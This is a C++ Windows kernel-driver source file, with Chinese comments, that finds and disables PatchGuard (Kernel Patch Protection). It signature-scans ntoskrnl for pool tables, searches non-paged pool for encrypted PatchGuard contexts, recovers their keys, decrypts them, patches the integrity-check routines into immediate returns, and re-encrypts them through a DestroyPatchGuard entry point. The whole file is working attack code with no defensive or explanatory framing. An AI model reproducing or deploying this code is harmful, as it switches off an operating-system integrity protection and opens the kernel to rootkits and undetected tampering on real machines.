#include "stdafx.h"
#include "patchguard.h"

namespace ddk::patchguard
{


	struct PATCH_GUARG_CONTEXT
	{
		INT64 lpkvPoolBigPageTableSize;
		PPOOL_TRACKER_BIG_PAGES lpkvPoolBigPageTable;
		INT64 lpkvMiNonPagedPoolStartAligned;
	};

	void DynamicAttackPatchguardEncryptCode(PUCHAR Context, ULONG_PTR Size, ULONG_PTR Key)
	{
		ULONG_PTR	Count, Index;
		PULONG_PTR	lpDecryptMem;
		ULONG_PTR	ContextKey;
		ULONG_PTR	DecryptSize;
		UCHAR		RorBit;

		ContextKey = Key;

		//申请一块内存，用来解密的！
		lpDecryptMem = (PULONG_PTR)ExAllocatePool(NonPagedPool, Size);
		RtlCopyMemory(lpDecryptMem, Context, Size);

		//首先解密出context头部的CmpAppendDllSection解密函数
		for (Count = 0; Count < 0xc8 / sizeof(ULONG_PTR); Count++)
		{
			lpDecryptMem[Count] ^= ContextKey;
		}

		//算出解密长度
		DecryptSize = lpDecryptMem[0xc0 / sizeof(ULONG_PTR)] >> 32;
		Index = DecryptSize;

		//然后解密出剩下的部分
		do
		{
			lpDecryptMem[(0xc8 / sizeof(ULONG_PTR) - 1) + Index] ^= ContextKey;
			RorBit = (UCHAR)Index;
			ContextKey = _rotr64(ContextKey, RorBit);
		} while (--Index);

		//解密完成~~
		for (Count = 0; Count < Size; Count++)
		{
			//下面是对明文context的处理

			if ((Count + 141 + 22) < Size && \
				memcmp((void*)((ULONG_PTR)lpDecryptMem + Count + 141), "\x48\x31\x84\xCA\xC0\x00\x00\x00\x48\xD3\xC8\xE2\xF3\x8B\x82\x88\x02\x00\x00\x48\x03\xC2", 22) == 0)
			{
				LOG_DEBUG("--CmpAppendDllSection address:%p", (ULONG_PTR)lpDecryptMem + Count);
				LOG_DEBUG("--CmpAppendDllSection address content:%p", *(ULONG_PTR*)((ULONG_PTR)lpDecryptMem + Count));
				memcpy((PUCHAR)lpDecryptMem + Count + 0x8, "\xC3\x90\x90\x90", 4);
			}

			if ((Count + 26 + 20) < Size && \
				memcmp((void*)((ULONG_PTR)lpDecryptMem + Count + 26), "\x41\x57\x48\x81\xEC\x50\x06\x00\x00\x48\x8D\xA8\x58\xFA\xFF\xFF\x48\x83\xE5\x80", 20) == 0)
			{
				LOG_DEBUG("--FsRtlMdlReadCompleteDevEx address:%p", (ULONG_PTR)lpDecryptMem + Count);
				LOG_DEBUG("--FsRtlMdlReadCompleteDevEx address content:%p", *(ULONG_PTR*)((ULONG_PTR)lpDecryptMem + Count));
				 //xor rax,rax
				 //retn
				*(ULONG32*)((ULONG_PTR)lpDecryptMem + Count) = 0xC3C03148;
			}

			if ((Count + 15 + 26) < Size && \
				memcmp((void*)((ULONG_PTR)lpDecryptMem + Count + 15), "\x8B\x82\x88\x02\x00\x00\x48\x03\xC2\x48\x83\xEC\x28\xFF\xD0\x48\x83\xC4\x28\x4C\x8B\x80\xE8\x00\x00\x00", 26) == 0)
			{
				//因为RtlLookupFunctionEntryEx这句lea     rdx, [rcx-1000h]变动的，无法定位，而利用其它的特征码又和CmpAppendDllSection相同了，所以这里我们判断一下头8个字节的特征
				if (*(ULONG_PTR*)((ULONG_PTR)lpDecryptMem + Count) == 0x085131481131482E)
				{
					LOG_DEBUG("--RtlLookupFunctionEntryEx address:%p", (ULONG_PTR)lpDecryptMem + Count);
					LOG_DEBUG("--RtlLookupFunctionEntryEx address content:%p", *(ULONG_PTR*)((ULONG_PTR)lpDecryptMem + Count + 0xF - 0x8));
					memcpy((PUCHAR)lpDecryptMem + Count + 8, "\xC3\x90\x90\x90\x90\x90\x90", 7);
				}
			}

			if ((Count + 15 + 14) < Size && \
				memcmp((void*)((ULONG_PTR)lpDecryptMem + Count + 15), "\x33\xC0\x49\x89\x02\x49\x83\xEA\x08\x4C\x3B\xD4\x73\xF4", 14) == 0)
			{
				LOG_DEBUG("--SdbpCheckDll address:%p", (ULONG_PTR)lpDecryptMem + Count);
				LOG_DEBUG("--SdbpCheckDll address content:%p", *(ULONG_PTR*)((ULONG_PTR)lpDecryptMem + Count));
				*(UCHAR*)((ULONG_PTR)lpDecryptMem + Count) = 0xC3;
			}

			if ((Count + 2 + 15) < Size && \
				memcmp((void*)((ULONG_PTR)lpDecryptMem + Count + 2), "\x9C\x48\x83\xEC\x20\x8B\x44\x24\x20\x45\x33\xC9\x45\x33\xC0", 15) == 0)
			{
				LOG_DEBUG("--KiTimerDispatch address:%p", (ULONG_PTR)lpDecryptMem + Count);
				LOG_DEBUG("--KiTimerDispatch address content:%p", *(ULONG_PTR*)((ULONG_PTR)lpDecryptMem + Count));
				memcpy((PUCHAR)lpDecryptMem + Count + 3, "\x59\xC3", 2);	//pop rcx  retn
			}

			if ((Count + 42 + 24) < Size && \
				memcmp((void*)((ULONG_PTR)lpDecryptMem + Count + 42), "\x48\x8B\xDA\xBA\x26\x00\x00\x00\x41\xB8\x30\x01\x00\x00\x48\x8D\x85\x80\x00\x00\x00\x45\x33\xFF", 24) == 0)
			{
				LOG_DEBUG("--sub_1401A2010 address:%p", (ULONG_PTR)lpDecryptMem + Count);
				LOG_DEBUG("--sub_1401A2010 address content:%p", *(ULONG_PTR*)((ULONG_PTR)lpDecryptMem + Count));
			}
		}

		//加密回去
		for (Count = 0; Count < 0xc8 / sizeof(ULONG_PTR); Count++)
		{
			lpDecryptMem[Count] ^= ContextKey;
		}

		Index = DecryptSize;

		//然后加密出剩下的部分
		do
		{
			lpDecryptMem[(0xc8 / sizeof(ULONG_PTR) - 1) + Index] ^= ContextKey;
			RorBit = (UCHAR)Index;
			ContextKey = _rotr64(ContextKey, RorBit);
		} while (--Index);

		//copy回去
		RtlCopyMemory(Context, lpDecryptMem, Size);

		ExFreePool(lpDecryptMem);
	}


	BOOLEAN AttackPatchGuard(PUCHAR MemStart, ULONG MemSize)
	{
		ULONG_PTR Key = 0;
		ULONG_PTR Count;
		ULONG_PTR SearchStart = (ULONG_PTR)MemStart;

		//因为下面的搜索最少要求memSize大于0x98，所以我们要在这里判断一下
		if (MemSize < 0x100)	//判断大点儿
		{
			return FALSE;
		}

		if (MmIsAddressValid(MemStart) == FALSE || MmIsAddressValid(MemStart + MemSize - sizeof(ULONG_PTR)) == FALSE)
		{
			return FALSE;
		}

		for (Count = 0; Count < MemSize; Count++)
		{

			//下面是对明文context的处理
			if ((Count + 141 + 22) < MemSize && \
				memcmp((void*)(SearchStart + Count + 141), "\x48\x31\x84\xCA\xC0\x00\x00\x00\x48\xD3\xC8\xE2\xF3\x8B\x82\x88\x02\x00\x00\x48\x03\xC2", 22) == 0)
			{
				LOG_DEBUG("CmpAppendDllSection address:%p", SearchStart + Count);
				LOG_DEBUG("CmpAppendDllSection address content:%p", *(ULONG_PTR*)(SearchStart + Count));
				memcpy((PUCHAR)SearchStart + Count + 0x8, "\xC3\x90\x90\x90", 4);
			}

			if ((Count + 26 + 20) < MemSize &&\
				memcmp((void*)(SearchStart + Count + 26), "\x41\x57\x48\x81\xEC\x50\x06\x00\x00\x48\x8D\xA8\x58\xFA\xFF\xFF\x48\x83\xE5\x80", 20) == 0)
			{
				LOG_DEBUG("FsRtlMdlReadCompleteDevEx address:%p", SearchStart + Count);
				LOG_DEBUG("FsRtlMdlReadCompleteDevEx address content:%p", *(ULONG_PTR*)(SearchStart + Count));
				*(ULONG32*)(SearchStart + Count) = 0xC3C03148;
			}

			if ((Count + 15 + 26) < MemSize &&\
				memcmp((void*)(SearchStart + Count + 15), "\x8B\x82\x88\x02\x00\x00\x48\x03\xC2\x48\x83\xEC\x28\xFF\xD0\x48\x83\xC4\x28\x4C\x8B\x80\xE8\x00\x00\x00", 26) == 0)
			{
				//因为RtlLookupFunctionEntryEx这句lea     rdx, [rcx-1000h]变动的，无法定位，而利用其它的特征码又和CmpAppendDllSection相同了，所以这里我们判断一下头8个字节的特征
				if (*(ULONG_PTR*)(SearchStart + Count) == 0x085131481131482E)
				{
					LOG_DEBUG("RtlLookupFunctionEntryEx address:%p", SearchStart + Count);
					LOG_DEBUG("RtlLookupFunctionEntryEx address content:%p", *(ULONG_PTR*)(SearchStart + Count + 0xF - 0x8));
					memcpy((PUCHAR)SearchStart + Count + 8, "\xC3\x90\x90\x90\x90\x90\x90", 7);
				}
			}

			if ((Count + 15 + 14) < MemSize &&\
				memcmp((void*)(SearchStart + Count + 15), "\x33\xC0\x49\x89\x02\x49\x83\xEA\x08\x4C\x3B\xD4\x73\xF4", 14) == 0)
			{
				LOG_DEBUG("SdbpCheckDll address:%p", SearchStart + Count);
				LOG_DEBUG("SdbpCheckDll address content:%p", *(ULONG_PTR*)(SearchStart + Count));
				*(UCHAR*)(SearchStart + Count) = 0xC3;
			}

			if ((Count + 2 + 15) < MemSize && \
				memcmp((void*)(SearchStart + Count + 2), "\x9C\x48\x83\xEC\x20\x8B\x44\x24\x20\x45\x33\xC9\x45\x33\xC0", 15) == 0)
			{
				LOG_DEBUG("KiTimerDispatch address:%p", SearchStart + Count);
				LOG_DEBUG("KiTimerDispatch address content:%p", *(ULONG_PTR*)(SearchStart + Count));
				memcpy((PUCHAR)SearchStart + Count + 3, "\x59\xC3", 2);	//pop rcx  retn
			}

			if ((Count + 42 + 24) < MemSize && \
				memcmp((void*)(SearchStart + Count + 42), "\x48\x8B\xDA\xBA\x26\x00\x00\x00\x41\xB8\x30\x01\x00\x00\x48\x8D\x85\x80\x00\x00\x00\x45\x33\xFF", 24) == 0)
			{
				LOG_DEBUG("sub_1401A2010 address:%p", SearchStart + Count);
				LOG_DEBUG("sub_1401A2010 address content:%p", *(ULONG_PTR*)(SearchStart + Count));
			}

			//////////////////////////////////////////////////////////////////////////
			//下面是对密文context的处理

			/*
			INIT:000000014057224B						loc_14057224B:                          ; CODE XREF: CmpAppendDllSection+98j
			INIT:000000014057224B 48 31 84 CA C0 00 00 00			xor     [rdx+rcx*8+0C0h], rax
			INIT:0000000140572253 48 D3 C8							ror     rax, cl
			INIT:0000000140572256 E2 F3								loop    loc_14057224B
			INIT:0000000140572258 8B 82 88 02 00 00					mov     eax, [rdx+288h]
			INIT:000000014057225E 48 03 C2							add     rax, rdx
			INIT:0000000140572261 48 83 EC 28						sub     rsp, 28h
			INIT:0000000140572265 FF D0								call    rax
			INIT:0000000140572267 48 83 C4 28						add     rsp, 28h
			*/
			if ((Count + 0xc0 + 0x8) < MemSize)
			{
				Key = *(ULONG_PTR*)(SearchStart + Count + 0x8D) ^ 0x000000C0CA843148;
				if (Key != 0 && (*(ULONG_PTR*)(SearchStart + Count + 0x8D + 0x08) ^ 0x88828BF3E2C8D348) == Key &&
					(*(ULONG_PTR*)(SearchStart + Count + 0x8D + 0x10) ^ 0x8348C20348000002) == Key &&
					(*(ULONG_PTR*)(SearchStart + Count + 0x8D + 0x18) ^ 0x28C48348D0FF28EC) == Key)
				{
					ULONG_PTR	ContextSize;
					ULONG_PTR	ContextKey;

					//ContextKey是解密出来的context key
					ContextKey = (*(ULONG_PTR*)(SearchStart + Count + 0x8)) ^ 0x1851314810513148;
					ContextSize = ((*(ULONG_PTR*)(SearchStart + Count + 0xc0)) ^ ContextKey) >> 32;	//context+0xc4是保存从+0xc8偏移context后面整个加密长度,注意只有4字节

																									//判断一下长度是否越界
					if ((Count + 0xc8 + ContextSize * 0x8) <= MemSize)
					{
						//找到了，我们进行处理pg的行为吧
						DynamicAttackPatchguardEncryptCode((PUCHAR)SearchStart + Count, 0xc8 + ContextSize * 0x8, ContextKey);
					}
				}
			}
		}

		return FALSE;
	}

	void DestroyPatchGuardByPool(PATCH_GUARG_CONTEXT *pPatchGuardContext)
	{
		ULONG_PTR	Index;
		ULONG_PTR	StartAddress;

		POOL_TRACKER_BIG_PAGES	PoolTrackerBigPagesItem;

		for (Index = 0; Index < *(ULONG_PTR*)pPatchGuardContext->lpkvPoolBigPageTableSize; Index++)
		{
			PoolTrackerBigPagesItem = pPatchGuardContext->lpkvPoolBigPageTable[Index];
			StartAddress = (ULONG_PTR)PoolTrackerBigPagesItem.Va;

			if (StartAddress == 0 || (StartAddress & 0x1) != 0)	//为0或1代表未使用
			{
				continue;
			}

			//我们只扫描非换页内存池的
			if (StartAddress < *(ULONG_PTR*)pPatchGuardContext->lpkvMiNonPagedPoolStartAligned)
			{
				//非换页内存池
				continue;
			}

			AttackPatchGuard((PUCHAR)StartAddress, (ULONG)PoolTrackerBigPagesItem.NumberOfBytes);
		}
	}

	BOOLEAN InitPatchGuardContext(PATCH_GUARG_CONTEXT *pPatchGuardContext)
	{
		NTSTATUS			st;
		ULONG_PTR			Index;
		RTL_PROCESS_MODULE_INFORMATION	SystemModule;
		LARGE_INTEGER		Assist;
		WCHAR				usNt[MAX_PATH];
		void*				lpNtMem = NULL;

		PIMAGE_DOS_HEADER	pImageDosHeader;
		PIMAGE_NT_HEADERS	pImageNtHeaders;

		RtlZeroMemory(usNt, MAX_PATH * sizeof(WCHAR));

		if (!NT_SUCCESS(ddk::util::GetSystemImageInfo("ntoskrnl.exe", &SystemModule)) &&
			!NT_SUCCESS(ddk::util::GetSystemImageInfo("ntkrnlpa.exe", &SystemModule)) &&
			!NT_SUCCESS(ddk::util::GetSystemImageInfo("ntkrnlmp.exe", &SystemModule)))
		{
			return FALSE;
		}

		mbstowcs(usNt, (PCCHAR)SystemModule.FullPathName, MAX_PATH);
		st = ddk::util::LoadFileToMem(usNt, &lpNtMem);
		if (!NT_SUCCESS(st))
		{
			return FALSE;
		}

		pImageDosHeader = (PIMAGE_DOS_HEADER)lpNtMem;
		pImageNtHeaders = (PIMAGE_NT_HEADERS)((ULONG_PTR)lpNtMem + pImageDosHeader->e_lfanew);

		for (Index = 0; Index < pImageNtHeaders->OptionalHeader.SizeOfImage; Index++)
		{
			if (memcmp((PVOID)((ULONG_PTR)lpNtMem + Index), "\x4E\x8D\x5C\x23\xFF\x41\xBE\x01\x00\x00\x00\x41\x8D\x41\xFF\x23\xF0", 17) == 0)
			{
				/*
				nt!ExProtectPool+0xd2:
				fffff800`03e8a9a2 0f85d3530a00    jne     nt! ?? ::FNODOBFM::`string'+0x2175e (fffff800`03f2fd7b)
				fffff800`03e8a9a8 4c8b0591e01e00  mov     r8,qword ptr [nt!PoolBigPageTable (fffff800`04078a40)]
				fffff800`03e8a9af 4d85c0          test    r8,r8
				fffff800`03e8a9b2 0f84f7530a00    je      nt! ?? ::FNODOBFM::`string'+0x21792 (fffff800`03f2fdaf)
				fffff800`03e8a9b8 4c8b0d79e01e00  mov     r9,qword ptr [nt!PoolBigPageTableSize (fffff800`04078a38)]
				fffff800`03e8a9bf 4e8d5c23ff      lea     r11,[rbx+r12-1]
				fffff800`03e8a9c4 41be01000000    mov     r14d,1
				fffff800`03e8a9ca 418d41ff        lea     eax,[r9-1]
				*/

				//PoolBigPageTable
				Assist.QuadPart = (ULONG_PTR)SystemModule.ImageBase + Index - 23;
				Assist.LowPart += *(ULONG*)(Assist.QuadPart + 3) + 7;
				pPatchGuardContext->lpkvPoolBigPageTable = (PPOOL_TRACKER_BIG_PAGES)*(ULONG_PTR*)Assist.QuadPart;

				//PoolBigPageTableSize
				Assist.QuadPart = (ULONG_PTR)SystemModule.ImageBase + Index - 7;
				Assist.LowPart += *(ULONG*)(Assist.QuadPart + 3) + 7;
				pPatchGuardContext->lpkvPoolBigPageTableSize = Assist.QuadPart;
				continue;
			}

			if (memcmp((PVOID)((ULONG_PTR)lpNtMem + Index), "\x4D\x8B\xE5\xB9\x0F\x00\x00\x00", 8) == 0 &&
				memcmp((PVOID)((ULONG_PTR)lpNtMem + Index + 15), "\x48\x81\xC3\xFF\xFF\x1F\x00\x48\xC1\xEB\x15", 11) == 0)
			{
				/*
				nt!MiExpandNonPagedPool+0x10f:
				fffff800`03e7297b 4d8be5          mov     r12,r13
				fffff800`03e7297e b90f000000      mov     ecx,0Fh
				fffff800`03e72983 4c2b2566782900  sub     r12,qword ptr [nt!MiNonPagedPoolStartAligned (fffff800`0410a1f0)]
				fffff800`03e7298a 4881c3ffff1f00  add     rbx,1FFFFFh
				fffff800`03e72991 48c1eb15        shr     rbx,15h
				fffff800`03e72995 e872760600      call    nt!KeAcquireQueuedSpinLock (fffff800`03eda00c)
				fffff800`03e7299a 448af0          mov     r14b,al
				fffff800`03e7299d 48391dc49b2100  cmp     qword ptr [nt!MiSystemVaTypeCount+0x28 (fffff800`0408c568)],rbx
				*/

				Assist.QuadPart = (ULONG_PTR)SystemModule.ImageBase + Index + 8;
				Assist.LowPart += *(ULONG*)(Assist.QuadPart + 3) + 7;
				pPatchGuardContext->lpkvMiNonPagedPoolStartAligned = Assist.QuadPart;
			}

			if (pPatchGuardContext->lpkvMiNonPagedPoolStartAligned != 0 && \
				pPatchGuardContext->lpkvPoolBigPageTable != 0 && \
				pPatchGuardContext->lpkvPoolBigPageTableSize != 0)
			{
				break;
			}
		}

		ExFreePool(lpNtMem);

		if (pPatchGuardContext->lpkvMiNonPagedPoolStartAligned == 0 || \
			pPatchGuardContext->lpkvPoolBigPageTable == 0 || \
			pPatchGuardContext->lpkvPoolBigPageTableSize == 0)
		{
			LOG_DEBUG("Find Thing not ok\r\n");
			return FALSE;
		}

		return TRUE;
	}

	BOOLEAN DestroyPatchGuard()
	{
		PATCH_GUARG_CONTEXT PatchGuardContext;

		RtlZeroMemory(&PatchGuardContext, sizeof(PATCH_GUARG_CONTEXT));
		if (InitPatchGuardContext(&PatchGuardContext) == FALSE)
		{
			return FALSE;
		}
		ddk::cpu_lock _cpu;
		_cpu.lock();
		auto OldIrql = KeRaiseIrqlToDpcLevel();
		DestroyPatchGuardByPool(&PatchGuardContext);
		KeLowerIrql(OldIrql);
		_cpu.unlock();
		LOG_DEBUG("Destroy PG OK\r\n");
		return TRUE;
	}

	void Disable_Early()
	{
		DestroyPatchGuard();
	}
}